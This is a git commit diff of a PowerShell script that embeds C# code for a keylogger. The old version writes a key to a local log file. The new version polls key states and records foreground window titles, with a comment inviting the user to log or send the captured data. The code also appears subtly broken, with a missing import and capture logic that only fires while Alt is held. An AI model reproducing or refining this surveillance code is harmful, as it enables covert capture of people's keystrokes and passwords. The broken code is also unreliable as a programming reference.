d3b1d4212af24cf619ac9797275e7520ca8b65f5
rindonbrg <140368244+rindonbrg@users.noreply.github.com>
2023-07-29 18:03:48 -0700

    1

--- rep00.ps1
+++ rep00.ps1
@@ -1,44 +1,54 @@
-# PowerShell Keylogger using RegisterHotKey function
-
-Add-Type -TypeDefinition @'
+Add-Type @"
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-
+using System.Windows.Forms;
 public class Keylogger {
     [DllImport("user32.dll")]
+    [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);
-
+    
     [DllImport("user32.dll")]
-    public static extern bool UnregisterHotKey(IntPtr hWnd, int id);
-
-    private const int MOD_ALT = 0x0001; // Alt key modifier
-    private const int WM_HOTKEY = 0x0312; // Hotkey message
-
-    public static void Main(string[] args) {
-        IntPtr hWnd = Process.GetCurrentProcess().MainWindowHandle;
-        int hotkeyId = 1; // You can change this to any unique value
-
-        // Register Alt + Shift + K as the hotkey (you can change this combination)
-        RegisterHotKey(hWnd, hotkeyId, MOD_ALT, (uint)0x4B);
-
-        // This loop is needed to keep the script running
-        while (true) {
-            try {
-                // Listen for the hotkey
-                if (Console.ReadKey(true).Key == ConsoleKey.K) {
-                    // Log the key (you can modify this to store the data elsewhere)
-                    string key = "K"; // Replace this with the desired key logging behavior
-                    string logPath = "C:\\temp\\keylog.txt"; // Replace this with the desired log file path
-                    System.IO.File.AppendAllText(logPath, key + Environment.NewLine);
+    public static extern IntPtr GetForegroundWindow();
+    
+    [DllImport("user32.dll")]
+    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+    
+    private const int MOD_ALT = 0x0001;
+    private const int WM_HOTKEY = 0x0312;
+    
+    public void StartKeylogger() {
+        if (RegisterHotKey(IntPtr.Zero, 1, MOD_ALT, (uint)Keys.K)) {
+            while (true) {
+                if (GetForegroundWindow() != IntPtr.Zero) {
+                    StringBuilder windowTitle = new StringBuilder(256);
+                    GetWindowText(GetForegroundWindow(), windowTitle, windowTitle.Capacity);
+                    string currentWindowTitle = windowTitle.ToString();
+                    string key = GetKey();
+                    // You can log or send the 'key' and 'currentWindowTitle' as per your desired goals.
                 }
-            } catch {
-                // Handle any errors here, or you can choose to ignore them
+                System.Threading.Thread.Sleep(100);
             }
         }
     }
+    
+    private string GetKey() {
+        string key = "";
+        foreach (Keys k in Enum.GetValues(typeof(Keys))) {
+            if (Control.ModifierKeys.HasFlag(Keys.Alt) && !Control.ModifierKeys.HasFlag(Keys.Control) && !Control.ModifierKeys.HasFlag(Keys.Shift)) {
+                if (GetAsyncKeyState(k) == -32767) {
+                    key = k.ToString();
+                    break;
+                }
+            }
+        }
+        return key;
+    }
+    
+    [DllImport("user32.dll")]
+    private static extern short GetAsyncKeyState(Keys vKey);
 }
-'@
+"@
 
-# Run the Keylogger
-[Keylogger]::Main(@())
+$logger = New-Object Keylogger
+$logger.StartKeylogger()
